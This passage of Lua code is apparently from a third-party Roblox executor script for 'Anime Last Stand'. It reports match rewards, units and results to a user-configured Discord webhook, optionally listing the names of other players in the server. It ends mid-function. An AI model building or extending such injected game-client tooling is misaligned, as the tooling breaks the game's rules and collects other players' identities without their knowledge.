                    for _, currency in ipairs(currencyKeys) do
                        if currency.key == tokenKey then
                            alreadyAdded = true
                            break
                        end
                    end
                    if not alreadyAdded then
                        local displayName = tokenKey:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                        table.insert(currencyKeys, {key = tokenKey, name = displayName})
                    end
                end
            end
            
            local nonRewardFields = {
                "LobbySettings", "GameSettings",
                "TotalStats", "Quests", "LevelRewardsClaimed", "EventData",
                "Titles", "UnitIndexMilestones", "SpecialEvoRequirements", "Potions", "AutoTrait",
                "CapsulePity", "InGamePity", "CustomItemPity", "CelestialPity2",
                "LastDailyChallengeTime", "LastQuestRefresh", "ClanJoinTime", "MoonFragmentPickTime", 
                "LastWeeklyQuestRefresh", "LastLoginTime", "LastDay",
                "SkinTicketFix", "TradingFix1", "CleanTasks6",
                "ObtainedStrings", "LevelReset", "ClaimedCandyLb", "LoginDayIncremented",
                "RCCells", "CurrentLobbyWorld", "HunterCash", "JewelsDonated",
                "MerchantHistory", "Slots", "UnitData", "ItemData", "ExperienceItemsData",
                "InfiniteLeaderboard", "BountyVersion", "Version",
            }
            
            local function isNonRewardField(key)
                for _, excluded in ipairs(nonRewardFields) do
                    if key == excluded then
                        return true
                    end
                end
                if key:find("Pity") or key:find("Last") or key:find("Time") or 
                   key:find("Settings") or key:find("History") or key:find("Claimed") or 
                   key:find("Progress") or key:find("Reset") or key:find("Fix") or 
                   key:find("Milestone") or key:find("Requirement") or key:find("Version") then
                    return true
                end
                return false
            end
            
            for _, currency in ipairs(currencyKeys) do
                if currency.key == "RaidTokens" or currency.key == "SoulCoin" then
                    local isRaidMode = currentGamemode == "Raids" or currentGamemode == "Raid" or currentGamemode:find("Raid") ~= nil
                    if not isRaidMode then
                        continue
                    end
                end
                
                local initial = 0
                if getgenv()._WebhookInitialData then
                    if getgenv()._WebhookInitialData.Tokens and getgenv()._WebhookInitialData.Tokens[currency.key] then
                        initial = getgenv()._WebhookInitialData.Tokens[currency.key]
                    else
                        initial = getValue(getgenv()._WebhookInitialData, currency.key, 0)
                    end
                end
                
                local current = getValue(clientData, currency.key, 0)
                local gained = current - initial
                
                if gained > 0 then
                    rewardsText = rewardsText .. "+" .. formatNumber(gained) .. " " .. currency.name .. " [ Total: " .. formatNumber(current) .. " ]\n"
                end
            end
            
            if clientData.ItemData then
                local initialItemData = getgenv()._WebhookInitialData and getgenv()._WebhookInitialData.ItemData or {}
                for itemName, itemInfo in pairs(clientData.ItemData) do
                    if itemInfo and type(itemInfo) == "table" and itemInfo.Amount then
                        local initial = getValue(initialItemData, itemName, 0)
                        local current = itemInfo.Amount or 0
                        local gained = current - initial
                        
                        if gained > 0 then
                            local displayName = itemName
                            if itemNamesModule and itemNamesModule[itemName] then
                                displayName = itemNamesModule[itemName]
                            else
                                displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                            end
                            rewardsText = rewardsText .. "+" .. formatNumber(gained) .. " " .. displayName .. " [ Total: " .. formatNumber(current) .. " ]\n"
                        end
                    elseif type(itemInfo) == "number" then
                        local initial = getValue(initialItemData, itemName, 0)
                        local current = itemInfo
                        local gained = current - initial
                        
                        if gained > 0 then
                            local displayName = itemName
                            if itemNamesModule and itemNamesModule[itemName] then
                                displayName = itemNamesModule[itemName]
                            else
                                displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                            end
                            rewardsText = rewardsText .. "+" .. formatNumber(gained) .. " " .. displayName .. " [ Total: " .. formatNumber(current) .. " ]\n"
                        end
                    end
                end
            end
            
            if clientData.ExperienceItemsData then
                local initialExpItems = getgenv()._WebhookInitialData and getgenv()._WebhookInitialData.ExperienceItemsData or {}
                for itemName, itemInfo in pairs(clientData.ExperienceItemsData) do
                    if itemInfo and type(itemInfo) == "table" and itemInfo.Amount then
                        local initial = getValue(initialExpItems, itemName, 0)
                        local current = itemInfo.Amount or 0
                        local gained = current - initial
                        
                        if gained > 0 then
                            local displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                            rewardsText = rewardsText .. "+" .. formatNumber(gained) .. " " .. displayName .. " [ Total: " .. formatNumber(current) .. " ]\n"
                        end
                    elseif type(itemInfo) == "number" then
                        local initial = getValue(initialExpItems, itemName, 0)
                        local current = itemInfo
                        local gained = current - initial
                        
                        if gained > 0 then
                            local displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                            rewardsText = rewardsText .. "+" .. formatNumber(gained) .. " " .. displayName .. " [ Total: " .. formatNumber(current) .. " ]\n"
                        end
                    end
                end
            end
            
            local unitDropsText = ""
            if clientData.UnitData and getgenv()._WebhookInitialData and getgenv()._WebhookInitialData.UnitCounts then
                local currentUnitCounts = {}
                for unitID, unitInfo in pairs(clientData.UnitData) do
                    if unitInfo and unitInfo.UnitName then
                        local unitName = unitInfo.UnitName
                        currentUnitCounts[unitName] = (currentUnitCounts[unitName] or 0) + 1
                    end
                end
                
                for unitName, currentCount in pairs(currentUnitCounts) do
                    local initialCount = getgenv()._WebhookInitialData.UnitCounts[unitName] or 0
                    local gained = currentCount - initialCount
                    
                    if gained > 0 then
                        local displayName = unitName
                        if unitNamesModule and unitNamesModule[unitName] then
                            displayName = unitNamesModule[unitName]
                        else
                            displayName = unitName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                        end
                        unitDropsText = unitDropsText .. "+" .. formatNumber(gained) .. " " .. displayName .. " [ Total: " .. formatNumber(currentCount) .. " ]\n"
                    end
                end
            end
            
            if unitDropsText ~= "" then
                if rewardsText == "" then
                    rewardsText = "**Units Obtained:**\n" .. unitDropsText
                else
                    rewardsText = rewardsText .. "\n**Units Obtained:**\n" .. unitDropsText
                end
            end
            
            if rewardsText == "" then
                rewardsText = "No rewards earned this round"
            end
            

            
            if getgenv().FinalExpChestRewards and next(getgenv().FinalExpChestRewards) then
                if rewardsText == "No rewards found" then
                    rewardsText = ""
                end
                if rewardsText ~= "" then
                    rewardsText = rewardsText .. "\n"
                end
                rewardsText = rewardsText .. "**Chests:**\n"
                for chestName, data in pairs(getgenv().FinalExpChestRewards) do
                    local amount = data.amount
                    local owned = data.owned
                    local total = owned + amount
                    rewardsText = rewardsText .. "+" .. formatNumber(amount) .. " " .. chestName .. " [ Total: " .. formatNumber(total) .. " ]\n"
                end
                getgenv().FinalExpChestRewards = {}
            end
            
            local unitsText = ""
            if clientData.Slots then
                local slots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
                for _, slotName in ipairs(slots) do
                    local slot = clientData.Slots[slotName]
                    if slot and slot.Value then
                        local level = slot.Level or 0
                        local kills = formatNumber(slot.Kills or 0)
                        local unitName = slot.Value
                        unitsText = unitsText .. "[ " .. level .. " ] " .. unitName .. " = " .. kills .. " ⚔️\n"
                    end
                end
            end
            
            local hasUnitDrop = false
            local unitDropName = ""
            
            if clientData.UnitData and getgenv()._WebhookInitialData and getgenv()._WebhookInitialData.UnitCounts then
                local currentUnitCounts = {}
                for unitID, unitInfo in pairs(clientData.UnitData) do
                    if unitInfo.UnitName then
                        local unitName = unitInfo.UnitName
                        currentUnitCounts[unitName] = (currentUnitCounts[unitName] or 0) + 1
                    end
                end
                
                for unitName, currentCount in pairs(currentUnitCounts) do
                    local initialCount = getgenv()._WebhookInitialData.UnitCounts[unitName] or 0
                    if currentCount > initialCount then
                        hasUnitDrop = true
                        unitDropName = unitName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                        break
                    end
                end
            end
            
            local description = "**Username:** ||" .. LocalPlayer.Name .. "||\n**Level:** " .. (clientData.Level or 0) .. " [" .. formatNumber(clientData.EXP or 0) .. "/" .. formatNumber(clientData.MaxEXP or 0) .. "]"
            
            local embedColor = 0x00ff00
            if matchResult and (matchResult:upper():find("DEFEAT") or matchResult:upper():find("LOSE") or matchResult:upper():find("LOSS")) then
                embedColor = 0xff0000
            end
            
            local function truncateField(value, maxLength)
                maxLength = maxLength or 1024
                if not value or type(value) ~= "string" then
                    return value or ""
                end
                if #value <= maxLength then
                    return value
                end
                return value:sub(1, maxLength - 3) .. "..."
            end
            
            local rewardsFields = {}
            if rewardsText and rewardsText ~= "" and rewardsText ~= "No rewards earned this round" then
                local maxRewardLength = 1024
                if #rewardsText <= maxRewardLength then
                    table.insert(rewardsFields, { name = "Rewards", value = rewardsText, inline = true })
                else
                    local lines = {}
                    for line in rewardsText:gmatch("[^\n]+") do
                        table.insert(lines, line)
                    end
                    
                    local currentField = ""
                    local fieldIndex = 1
                    for _, line in ipairs(lines) do
                        if #currentField + #line + 1 > maxRewardLength then
                            if currentField ~= "" then
                                table.insert(rewardsFields, { name = "Rewards" .. (fieldIndex > 1 and " (Part " .. fieldIndex .. ")" or ""), value = currentField, inline = true })
                                fieldIndex = fieldIndex + 1
                                currentField = line
                            else
                                table.insert(rewardsFields, { name = "Rewards" .. (fieldIndex > 1 and " (Part " .. fieldIndex .. ")" or ""), value = truncateField(line, maxRewardLength), inline = true })
                                fieldIndex = fieldIndex + 1
                            end
                        else
                            if currentField == "" then
                                currentField = line
                            else
                                currentField = currentField .. "\n" .. line
                            end
                        end
                    end
                    if currentField ~= "" then
                        table.insert(rewardsFields, { name = "Rewards" .. (fieldIndex > 1 and " (Part " .. fieldIndex .. ")" or ""), value = currentField, inline = true })
                    end
                end
            else
                table.insert(rewardsFields, { name = "Rewards", value = rewardsText or "No rewards earned this round", inline = true })
            end
            
            local embedFields = {
                { name = "Player Stats", value = truncateField(formatStats() ~= "" and formatStats() or "N/A", 1024), inline = true }
            }
            
            for _, field in ipairs(rewardsFields) do
                table.insert(embedFields, field)
            end
            
            table.insert(embedFields, { name = "Units", value = truncateField(unitsText ~= "" and unitsText or "No units", 1024), inline = false })
            table.insert(embedFields, { name = "Match Result", value = truncateField((matchTime or "00:00:00") .. " - Wave " .. tostring(matchWave or "0") .. "\n" .. (mapName or "Unknown Map") .. ((mapDifficulty and mapDifficulty ~= "Unknown") and (" [" .. mapDifficulty .. "]") or "") .. " - " .. (matchResult or "Unknown"), 1024), inline = false })
            
            if getgenv().WebhookIncludePlayerCount or getgenv().WebhookIncludePlayerNames then
                local playerInfo = ""
                local playerCount = #Players:GetPlayers()
                
                if getgenv().WebhookIncludePlayerCount then
                    playerInfo = "**Players in Server:** " .. playerCount .. "/12\n"
                end
                
                if getgenv().WebhookIncludePlayerNames then
                    local playerNames = {}
                    for _, player in ipairs(Players:GetPlayers()) do
                        table.insert(playerNames, "||" .. player.DisplayName .. " (@" .. player.Name .. ")||")
                    end
                    playerInfo = playerInfo .. "**Players:**\n" .. table.concat(playerNames, "\n")
                end
                
                table.insert(embedFields, { name = "Server Info", value = truncateField(playerInfo, 1024), inline = false })
            end
            
            local embed = {
                title = "Anime Last Stand",
                description = truncateField(description or "N/A", 4096),
                color = embedColor,
                fields = embedFields,
                footer = { text = (getgenv()._MemoryProfiler and getgenv()._MemoryProfiler.stat0x1 or "Byorl Last Stand") .. " | " .. (getgenv()._MemoryProfiler and getgenv()._MemoryProfiler.stat0x2 or "https://discord.gg/V3WcdHpd3J") }
            }
            
            local webhookContent = ""
            if hasUnitDrop and getgenv().PingOnSecretDrop and getgenv().DiscordUserID and getgenv().DiscordUserID ~= "" then
                webhookContent = "<@" .. getgenv().DiscordUserID .. "> 🎉 **SECRET UNIT DROP: " .. unitDropName .. "**"
            end
            
            if not getgenv()._webhookSessionID then
                getgenv()._webhookSessionID = tostring(tick())
            end
            
            if not getgenv()._lastWebhookSendTime then
                getgenv()._lastWebhookSendTime = 0
            end
            
            local timeSinceLastSend = tick() - getgenv()._lastWebhookSendTime
            if timeSinceLastSend < 5 then
                print("[Webhook] ⏱️ Cooldown active - " .. string.format("%.1f", 5 - timeSinceLastSend) .. "s remaining")
                getgenv().WebhookProcessing = false
                return
            end
            
            local webhookHash = getgenv()._webhookSessionID .. "_" .. LocalPlayer.Name .. "_" .. matchTime .. "_" .. matchWave .. "_" .. rewardsText .. "_" .. (hasUnitDrop and unitDropName or "")
            
            if webhookHash == getgenv()._lastWebhookHash then
                print("[Webhook] 🔄 Duplicate detected (same as last)")
                getgenv().WebhookProcessing = false
                return
            end
            
            if getgenv()._lastWebhookHashList then
                for _, oldHash in ipairs(getgenv()._lastWebhookHashList) do
                    if oldHash == webhookHash then
                        print("[Webhook] 🔄 Duplicate detected (in history)")
                        getgenv().WebhookProcessing = false
                        return
                    end
                end
            else
                getgenv()._lastWebhookHashList = {}
            end
            
            getgenv()._lastWebhookHash = webhookHash
            table.insert(getgenv()._lastWebhookHashList, webhookHash)
            
            if #getgenv()._lastWebhookHashList > 5 then
                table.remove(getgenv()._lastWebhookHashList, 1)
            end
            
            getgenv()._lastWebhookSendTime = tick()
            
            local sendSuccess = false
            local sendAttempts = 0
            local maxAttempts = 3 
            
            print("[Webhook] Attempting to send webhook...")
            print("[Webhook] URL: " .. (getgenv().WebhookURL and string.sub(getgenv().WebhookURL, 1, 20) .. "..." or "NIL"))
            
            while not sendSuccess and sendAttempts < maxAttempts do
                sendAttempts = sendAttempts + 1
                print("[Webhook] Attempt " .. sendAttempts .. "/" .. maxAttempts)
                
                local ok, result = pcall(function()
                    if webhookContent ~= "" then
                        print("[Webhook] Sending with content: " .. string.sub(webhookContent, 1, 50))
                        return SendMessageEMBED(getgenv().WebhookURL, embed, webhookContent)
                    else
                        print("[Webhook] Sending without content")
                        return SendMessageEMBED(getgenv().WebhookURL, embed)
                    end
                end)
                
                if ok and result then
                    sendSuccess = true
                    print("[Webhook] ✅ Webhook sent successfully!")
                    
                    pcall(function()
                        local elapsed = RS:FindFirstChild("ElapsedTime")
                        if elapsed and elapsed.Value then
                            getgenv()._RoundStartTime = elapsed.Value
                        end
                    end)
                    
                    Window:Notify({
                        Title = "Webhook Sent",
                        Description = hasUnitDrop and "Unit drop detected!" or "Match results sent",
                        Lifetime = 3
                    })
                else
                    warn("[Webhook] ❌ Send failed (Attempt " .. sendAttempts .. "/" .. maxAttempts .. ")")
                    if not ok then
                        warn("[Webhook] Error: " .. tostring(result))
                    else
                        warn("[Webhook] Result was false/nil")
                    end
                    
                    if sendAttempts < maxAttempts then
                        task.wait(1)
                    end
                end
            end
            
            if not sendSuccess then
                warn("[Webhook] ❌ Failed to send after " .. maxAttempts .. " attempts")
                warn("[Webhook] Check webhook URL and network connection")
            end
        end)
        
        if not success then
            warn("[Webhook] ❌ Critical error in sendWebhook: " .. tostring(err))
            print("[Webhook] Error stack:", debug.traceback())
            getgenv().WebhookProcessing = false
        end
        
        task.spawn(function()
            local elapsed = tick() - webhookStartTime
            if elapsed < maxWebhookDuration then
                task.wait(math.max(0.5, maxWebhookDuration - elapsed))
            end
            
            if getgenv().WebhookProcessing then
                warn("[Webhook] ⚠️ WebhookProcessing flag was still true after timeout, forcing reset")
                getgenv().WebhookProcessing = false
            end
        end)
        
        task.wait(0.5)
        getgenv().WebhookProcessing = false
    end
    
    local webhookConnection = nil
    local lastWebhookTime = 0
    local WEBHOOK_COOLDOWN = 30
    
    local function setupWebhookTrigger()
        if webhookConnection then
            webhookConnection:Disconnect()
        end
        
        webhookConnection = ConnectionManager:trackGroup("Webhook",
            LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
                if child.Name == "EndGameUI" and getgenv().WebhookEnabled then
                if getgenv().WebhookProcessing then
                    return
                end
                
                local isFinalExpedition = false
                local hasLeaveButton = false
                pcall(function()
                    local gamemode = RS:FindFirstChild("Gamemode")
                    if gamemode and gamemode.Value == "FinalExpedition" then
                        isFinalExpedition = true
                    end
                end)
                
                if isFinalExpedition then
                    print("[Webhook] Final Expedition detected, waiting for Prompt GUI to close...")
                    
                    local promptWait = 0
                    while promptWait < 15 do
                        local promptExists = false
                        pcall(function()
                            local promptGui = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                            if promptGui and promptGui.Enabled then
                                promptExists = true
                            end
                        end)
                        
                        if not promptExists then
                            print("[Webhook] Prompt GUI closed after " .. promptWait .. "s, checking if this is the final EndGameUI...")
                            break
                        end
                        
                        task.wait(0.5)
                        promptWait = promptWait + 0.5
                    end
                    
                    task.wait(2)
                    
                    local isFinalScreen = false
                    pcall(function()
                        local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
                        if endGameUI then
                            print("[Webhook] EndGameUI still exists, checking buttons...")
                            
                            local function findButton(parent, buttonName)
                                if not parent then return nil end
                                local button = parent:FindFirstChild(buttonName, true)
                                return button
                            end
                            
                            local leaveButton = findButton(endGameUI, "Leave")
                            local nextButton = findButton(endGameUI, "Next")
                            local retryButton = findButton(endGameUI, "Retry")
                            
                            print("[Webhook] Leave: " .. tostring(leaveButton and leaveButton.Visible))
                            print("[Webhook] Retry: " .. tostring(retryButton and retryButton.Visible))
                            print("[Webhook] Next: " .. tostring(nextButton and nextButton.Visible))
                            
                            if (leaveButton and leaveButton.Visible) or (retryButton and retryButton.Visible) then
                                isFinalScreen = true
                                print("[Webhook] Found Leave or Retry button - this is the final screen")
                            elseif nextButton and nextButton.Visible then
                                local nextText = nextButton:FindFirstChild("TextLabel", true)
                                if nextText and nextText.Text then
                                    print("[Webhook] Next button text: " .. nextText.Text)
                                    if nextText.Text:lower():find("leave") then
                                        isFinalScreen = true
                                        print("[Webhook] Next button says 'Leave' - this is the final screen")
                                    else
                                        isFinalScreen = true
                                        print("[Webhook] Next button found - assuming final screen")
                                    end
                                else
                                    isFinalScreen = true
                                    print("[Webhook] Next button found (no text) - assuming final screen")
                                end
                            else
                                print("[Webhook] No buttons found, checking if EndGameUI persists...")
                                task.wait(2)
                                if LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") then
                                    isFinalScreen = true
                                    print("[Webhook] EndGameUI still exists after 2s - assuming final screen")
                                end
                            end
                        else
                            print("[Webhook] EndGameUI no longer exists")
                        end
                    end)
                    
                    if not isFinalScreen then
                        print("[Webhook] Skipping intermediate EndGameUI in Final Expedition")
                        return
                    else
                        print("[Webhook] Final EndGameUI confirmed in Final Expedition")
                    end
                end
                
                pcall(function()
                    local elapsed = RS:FindFirstChild("ElapsedTime")
                    local wave = RS:FindFirstChild("Wave")
                    
                    if elapsed and elapsed.Value then
                        if not getgenv()._RoundStartTime or getgenv()._RoundStartTime <= 0 then
                            getgenv()._RoundStartTime = elapsed.Value
                        end
                        
                        local roundTime = elapsed.Value
                        
                        if getgenv()._RoundStartTime and getgenv()._RoundStartTime > 0 then
                            roundTime = elapsed.Value - getgenv()._RoundStartTime
                            if roundTime < 0 or roundTime > elapsed.Value then
                                roundTime = elapsed.Value
                            end
                        end
                        
                        local timeScale = 1
                        pcall(function()
                            local timeScaleValue = RS:FindFirstChild("TimeScale")
                            if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                                timeScale = timeScaleValue.Value or 1
                            end
                        end)
                        
                        local realTime = roundTime / timeScale
                        local seconds = math.floor(realTime)
                        local hours = math.floor(seconds / 3600)
                        local minutes = math.floor((seconds % 3600) / 60)
                        local secs = seconds % 60
                        getgenv()._CachedMatchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                    end
                    
                    if wave and wave.Value then
                        getgenv()._CachedMatchWave = tostring(wave.Value)
                    end
                    
                    local gamemode = RS:FindFirstChild("Gamemode")
                    if gamemode and gamemode.Value then
                        getgenv()._CachedGamemode = tostring(gamemode.Value)
                    end
                    
                    local matchResult, matchWave = getgenv()._GetMatchResult()
                    if matchResult then
                        getgenv()._CachedMatchResult = matchResult
                    end
                    
                    ClientDataCache.module = nil
                    ClientDataCache.lastUpdate = 0
                    local endGameClientData = getClientData()
                    if endGameClientData then
                        getgenv()._WebhookEndGameData = endGameClientData
                    else
                        warn("[Webhook] Failed to get endGame ClientData")
                    end
                end)
                
                task.wait(0.5)
                
                print("[Webhook] EndGameUI detected, triggering webhook...")
                
                local webhookFunc = getgenv()._SendWebhookFunction
                
                task.spawn(function()
                    local success, err = pcall(function()
                        if webhookFunc then
                            webhookFunc()
                        else
                            warn("[Webhook] ❌ sendWebhook function is nil!")
                        end
                    end)
                    
                    if not success then
                        warn("[Webhook] ❌ Error calling webhook function: " .. tostring(err))
                        print("[Webhook] Error stack:", debug.traceback())
                        getgenv().WebhookProcessing = false
                    end
                end)
            end
        end))
    end
    
    getgenv()._SendMatchWebhook = getgenv()._SendWebhookFunction
    
    getgenv()._SendWebhookManual = function()
        if not getgenv().WebhookEnabled then
            warn("[Webhook] Webhook is disabled")
            return
        end
        
        print("[Webhook] Manual trigger requested")
        if getgenv()._SendWebhookFunction then
            getgenv()._SendWebhookFunction()
        end
    end
    
    setupWebhookTrigger()
    
    local unitNamesModule = nil
    local itemNamesModule = nil
    pcall(function()
        local modules = RS:FindFirstChild("Modules")
        if modules then
            local unitNamesData = modules:FindFirstChild("UnitNames")
            if unitNamesData then
                unitNamesModule = require(unitNamesData)
            end
            local itemNamesData = modules:FindFirstChild("ItemNames")
            if itemNamesData then
                itemNamesModule = require(itemNamesData)
            end
        end
    end)

    getgenv()._RefreshWebhookInitialData = function()
        pcall(function()
            local elapsed = RS:FindFirstChild("ElapsedTime")
            if elapsed and elapsed.Value then
                getgenv()._RoundStartTime = elapsed.Value
            end
        end)
        
        local clientData = getClientData()
        if clientData then
            getgenv()._WebhookInitialData.Jewels = clientData.Jewels or 0
            getgenv()._WebhookInitialData.Gold = clientData.Gold or 0
            getgenv()._WebhookInitialData.Emeralds = clientData.Emeralds or 0
            getgenv()._WebhookInitialData.Rerolls = clientData.Rerolls or 0
            getgenv()._WebhookInitialData.CandyBasket = clientData.CandyBasket or 0
            getgenv()._WebhookInitialData.HeroTokens = clientData.HeroTokens or 0
            getgenv()._WebhookInitialData.EXP = clientData.EXP or 0
            getgenv()._WebhookInitialData.HalloweenCookies = clientData.HalloweenCookies or 0
            getgenv()._WebhookInitialData.MagicCoins = clientData.MagicCoins or 0
            getgenv()._WebhookInitialData.EmberTokens = clientData.EmberTokens or 0
            getgenv()._WebhookInitialData.BlazeTokens = clientData.BlazeTokens or 0
            getgenv()._WebhookInitialData.HorseTokens = clientData.HorseTokens or 0
            getgenv()._WebhookInitialData.DevilDogTokens = clientData.DevilDogTokens or 0
            getgenv()._WebhookInitialData.TitanRushTokens = clientData.TitanRushTokens or 0
            getgenv()._WebhookInitialData.SoccerTokens = clientData.SoccerTokens or 0
            getgenv()._WebhookInitialData.SlimeCoins = clientData.SlimeCoins or 0
            getgenv()._WebhookInitialData.RaidTokens = clientData.RaidTokens or 0
            getgenv()._WebhookInitialData.SummerCorals = clientData.SummerCorals or 0
            getgenv()._WebhookInitialData.SoulCoin = clientData.SoulCoin or 0
            getgenv()._WebhookInitialData.CandyCanes = clientData.CandyCanes or 0
            
            getgenv()._WebhookInitialData.Tokens = {}
            for key, value in pairs(clientData) do
                if type(key) == "string" and key:find("Tokens") and type(value) == "number" then
                    getgenv()._WebhookInitialData.Tokens[key] = value
                end
            end
            
            getgenv()._WebhookInitialData.ItemData = {}
            if clientData.ItemData then
                for itemName, itemInfo in pairs(clientData.ItemData) do
                    if itemInfo.Amount then
                        getgenv()._WebhookInitialData.ItemData[itemName] = itemInfo.Amount
                    end
                end
            end
            
            getgenv()._WebhookInitialData.ExperienceItemsData = {}
            if clientData.ExperienceItemsData then
                for itemName, itemInfo in pairs(clientData.ExperienceItemsData) do
                    if itemInfo.Amount then
                        getgenv()._WebhookInitialData.ExperienceItemsData[itemName] = itemInfo.Amount
                    end
                end
            end
            
            getgenv()._WebhookInitialData.UnitCounts = {}
            if clientData.UnitData then
                for unitID, unitInfo in pairs(clientData.UnitData) do
                    if unitInfo.UnitName then
                        local unitName = unitInfo.UnitName
                        getgenv()._WebhookInitialData.UnitCounts[unitName] = (getgenv()._WebhookInitialData.UnitCounts[unitName] or 0) + 1
                    end
                end
            end
            
            print("[Webhook] Initial data refreshed successfully")
        else
            warn("[Webhook] Failed to get client data")
        end
    end
    
    ConnectionManager:trackGroup("Webhook",
        LocalPlayer.PlayerGui.ChildRemoved:Connect(function(child)
            if child.Name == "EndGameUI" then
                task.wait(1)
                if getgenv().WebhookProcessing then
                    getgenv().WebhookProcessing = false
                end
                
                if getgenv().WebhookEnabled then
                    task.wait(2)
                    getgenv()._RefreshWebhookInitialData()
                end
            end
        end))
    
    task.spawn(function()
        local lastGameStartedState = false
        while true do
            task.wait(0.5)
            
            local currentGameStarted = false
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if gs and gs.Value ~= nil then
                    currentGameStarted = gs.Value
                end
            end)
            
            if not lastGameStartedState and currentGameStarted then
                task.wait(1)
                
                pcall(function()
                    local elapsed = RS:FindFirstChild("ElapsedTime")
                    if elapsed and elapsed.Value then
                        getgenv()._RoundStartTime = elapsed.Value
                    end
                end)
                
                if getgenv()._RefreshWebhookInitialData then
                    getgenv()._RefreshWebhookInitialData()
                end
            end
            
            if lastGameStartedState and not currentGameStarted then
                task.wait(2)
                
                if getgenv().WebhookEnabled and not getgenv().WebhookProcessing then
                    print("[Webhook] GameStarted changed to false - match ended (party mode trigger)")
                    
                    local endGameUIExists = false
                    pcall(function()
                        endGameUIExists = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") ~= nil
                    end)
                    
                    if not endGameUIExists then
                        print("[Webhook] No EndGameUI found - triggering webhook via GameStarted (non-host player)")
                        
                        pcall(function()
                            local elapsed = RS:FindFirstChild("ElapsedTime")
                            local wave = RS:FindFirstChild("Wave")
                            
                            if elapsed and elapsed.Value then
                                if not getgenv()._RoundStartTime or getgenv()._RoundStartTime <= 0 then
                                    getgenv()._RoundStartTime = elapsed.Value
                                end
                                
                                local roundTime = elapsed.Value
                                
                                if getgenv()._RoundStartTime and getgenv()._RoundStartTime > 0 then
                                    roundTime = elapsed.Value - getgenv()._RoundStartTime
                                    if roundTime < 0 or roundTime > elapsed.Value then
                                        roundTime = elapsed.Value
                                    end
                                end
                                
                                local timeScale = 1
                                pcall(function()
                                    local timeScaleValue = RS:FindFirstChild("TimeScale")
                                    if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                                        timeScale = timeScaleValue.Value or 1
                                    end
                                end)
                                
                                local realTime = roundTime / timeScale
                                local seconds = math.floor(realTime)
                                local hours = math.floor(seconds / 3600)
                                local minutes = math.floor((seconds % 3600) / 60)
                                local secs = seconds % 60
                                getgenv()._CachedMatchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                            end
                            
                            if wave and wave.Value then
                                getgenv()._CachedMatchWave = tostring(wave.Value)
                            end
                            
                            local gamemode = RS:FindFirstChild("Gamemode")
                            if gamemode and gamemode.Value then
                                getgenv()._CachedGamemode = tostring(gamemode.Value)
                            end
                            
                            getgenv()._CachedMatchResult = "Match Complete"
                            
                            ClientDataCache.module = nil
                            ClientDataCache.lastUpdate = 0
                            local endGameClientData = getClientData()
                            if endGameClientData then
                                getgenv()._WebhookEndGameData = endGameClientData
                            end
                        end)
                        
                        task.wait(0.5)
                        
                        task.spawn(function()
                            local success, err = pcall(function()
                                if getgenv()._SendWebhookFunction then
                                    getgenv()._SendWebhookFunction()
                                else
                                    warn("[Webhook] sendWebhook function is nil!")
                                end
                            end)
                            
                            if not success then
                                warn("[Webhook] Error calling webhook function: " .. tostring(err))
                                getgenv().WebhookProcessing = false
                            end
                        end)
                    else
                        print("[Webhook] EndGameUI exists - will use normal trigger")
                    end
                end
            end
            
            lastGameStartedState = currentGameStarted
        end
    end)



do
    task.spawn(function()
        local RS = game:GetService("ReplicatedStorage")
        local waveValueObj = nil
        local lastWave = nil
        local lastSeamlessSend = 0
        local MIN_INTERVAL = 30 
        local WAVE_THRESHOLD = 5 
        while true do
            task.wait(1)
            if not getgenv().WebhookEnabled then
                continue
            end
            local hasEndGameUI = false
            pcall(function()
                hasEndGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI") ~= nil
            end)
            if hasEndGameUI then
                lastWave = nil 
                continue
            end
            pcall(function()
                waveValueObj = waveValueObj or RS:FindFirstChild("Wave")
                if not waveValueObj or not waveValueObj.Value then return end
                local currentWave = waveValueObj.Value
                if not lastWave then
                    lastWave = currentWave
                    return
                end
                if lastWave >= WAVE_THRESHOLD and currentWave <= 1 then
                    local now = tick()
                    if now - lastSeamlessSend >= MIN_INTERVAL and not getgenv().WebhookProcessing then
                        lastSeamlessSend = now
                        pcall(function()
                            local elapsed = RS:FindFirstChild("ElapsedTime")
                            if elapsed and elapsed.Value then
                                local roundTime = elapsed.Value
                                if getgenv()._RoundStartTime and getgenv()._RoundStartTime > 0 then
                                    roundTime = elapsed.Value - getgenv()._RoundStartTime
                                    if roundTime < 0 or roundTime > elapsed.Value then
                                        roundTime = elapsed.Value
                                    end
                                end
                                local timeScale = 1
                                local timeScaleValue = RS:FindFirstChild("TimeScale")
                                if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                                    timeScale = timeScaleValue.Value or 1
                                end
                                local realTime = roundTime / timeScale
                                local seconds = math.floor(realTime)
                                local hours = math.floor(seconds / 3600)
                                local minutes = math.floor((seconds % 3600) / 60)
                                local secs = seconds % 60
                                getgenv()._CachedMatchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                            end
                            getgenv()._CachedMatchWave = tostring(lastWave)
                            local gamemode = RS:FindFirstChild("Gamemode")
                            if gamemode and gamemode.Value then
                                getgenv()._CachedGamemode = tostring(gamemode.Value)
                            end
                            getgenv()._CachedMatchResult = "Seamless Restart"
                            ClientDataCache.module = nil
                            ClientDataCache.lastUpdate = 0
                            local snapshot = getClientData()
                            if snapshot then
                                getgenv()._WebhookEndGameData = snapshot
                            end
                        end)
                        getgenv()._WebhookSeamlessRestart = true
                        local sendFunc = getgenv()._SendWebhookFunction
                        if sendFunc then
                            task.spawn(function()
                                local ok, err = pcall(sendFunc)
                                if not ok then
